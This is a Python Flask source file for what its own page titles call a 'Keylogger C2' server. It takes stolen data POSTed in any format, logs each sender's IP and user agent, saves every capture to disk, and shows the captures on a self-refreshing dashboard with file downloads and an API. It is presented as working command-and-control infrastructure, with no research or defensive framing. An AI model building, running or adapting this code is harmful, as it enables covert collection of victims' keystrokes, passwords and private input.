from flask import Flask, request, jsonify, send_from_directory
import os
import json
import time
from datetime import datetime
from collections import deque

app = Flask(__name__)
DATA_DIR = 'data'
os.makedirs(DATA_DIR, exist_ok=True)

# Live captures (no encryption needed)
live_captures = deque(maxlen=500)

@app.route('/log', methods=['POST'])
def log_capture():
    try:
        # Accept ANY data format
        if request.is_json:
            data = request.json
        elif request.form:
            data = dict(request.form)
        else:
            data = {'raw': request.data.decode('utf-8', errors='ignore')}
        
        # Add metadata
        capture = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3],
            'ip': request.remote_addr,
            'user_agent': str(request.headers.get('User-Agent', 'unknown'))[:100],
            'data': data,
            'data_str': json.dumps(data, indent=2, ensure_ascii=False),
            'size_bytes': len(str(data))
        }
        
        # Store in memory + file
        live_captures.append(capture)
        
        filename = f"capture_{int(time.time()*1000)}.json"
        filepath = os.path.join(DATA_DIR, filename)
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(capture, f, indent=2, ensure_ascii=False)
        
        print(f"📥 [{capture['ip']}] {capture['size_bytes']} bytes | Keys: {len(str(data))}")
        return jsonify({'status': 'OK', 'filename': filename}), 200
        
    except Exception as e:
        print(f"❌ {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/', methods=['GET'])
def dashboard():
    recent = list(live_captures)[-15:]
    files = os.listdir(DATA_DIR) if os.path.exists(DATA_DIR) else []
    
    # FIX: Build HTML captures properly
    captures_html = ""
    for c in recent:
        captures_html += f'''
        <div class="capture">
            <div class="timestamp">
                <span class="ip">{c["ip"]}</span> {c["timestamp"]}
            </div>
            <div class="data">{c["data_str"][:800]}...</div>
        </div>
        '''
    
    # FIX: Build files HTML properly  
    files_html = ""
    for f in sorted(files)[-8:]:
        files_html += f'<a href="/files/{f}" target="_blank" class="file-link">{f}</a><br>'
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>🔥 Keylogger C2 Dashboard</title>
        <meta http-equiv="refresh" content="3">
        <style>
            body {{ font-family: 'Courier New', monospace; background: #0d1117; color: #58a6ff; padding: 20px; margin: 0; }}
            .header {{ background: #161b22; padding: 20px; border-radius: 10px; text-align: center; margin-bottom: 20px; }}
            .stats {{ display: flex; gap: 30px; justify-content: center; }}
            .stat {{ text-align: center; }}
            .stat-number {{ font-size: 28px; font-weight: bold; color: #58a6ff; }}
            .capture {{ background: #21262d; margin: 12px 0; padding: 18px; border-left: 5px solid #58a6ff; border-radius: 8px; }}
            .timestamp {{ color: #8b949e; font-size: 13px; margin-bottom: 8px; }}
            .ip {{ color: #ff7b72; font-weight: bold; }}
            .data {{ white-space: pre-wrap; font-size: 14px; color: #f0f6fc; line-height: 1.4; }}
            .files {{ background: #161b22; padding: 20px; border-radius: 10px; margin: 20px 0; }}
            .file-link {{ color: #58a6ff; text-decoration: none; margin-right: 20px; font-size: 14px; }}
            .file-link:hover {{ text-decoration: underline; }}
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🔥 Ultimate Keylogger C2</h1>
            <div class="stats">
                <div class="stat">
                    <div class="stat-number">{len(live_captures)}</div>
                    <div>Total Captures</div>
                </div>
                <div class="stat">
                    <div class="stat-number">{len(files)}</div>
                    <div>Files Saved</div>
                </div>
            </div>
        </div>
        
        <div class="files">
            <h3>📁 Recent Files ({len(files)})</h3>
            {files_html}
        </div>
        
        <h3>📊 Live Captures (Last 15)</h3>
        {captures_html}
        
        <script>window.scrollTo(0, document.body.scrollHeight);</script>
    </body>
    </html>
    """
    return html

@app.route('/files/<filename>')
def serve_file(filename):
    return send_from_directory(DATA_DIR, filename)

@app.route('/api/captures')
def api_captures():
    return jsonify(list(live_captures)[-20:])

if __name__ == '__main__':
    print("🚀 C2 Server starting... (No encryption)")
    print("🌐 Dashboard: http://localhost:5000")
    print("📥 POST to: http://localhost:5000/log")
    app.run(host='0.0.0.0', port=5000, debug=True)